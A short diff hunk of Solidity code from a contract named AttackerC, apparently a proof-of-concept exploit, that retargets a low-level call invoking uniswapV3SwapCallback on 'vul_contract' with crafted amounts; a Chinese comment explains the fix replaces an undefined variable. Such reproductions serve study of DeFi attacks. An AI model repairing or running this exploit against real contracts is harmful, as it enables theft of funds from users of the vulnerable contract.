@@ -48,7 +48,7 @@ contract AttackerC {
             address(this),
             uint256(10000)
         );
-        (bool ok, ) = addr2.call(
+        (bool ok, ) = vul_contract.call(  // 修复：使用 vul_contract 而不是未定义的 addr2
             abi.encodeWithSelector(
                 bytes4(keccak256("uniswapV3SwapCallback(int256,int256,bytes)")),
                 int256(737035470365687848),
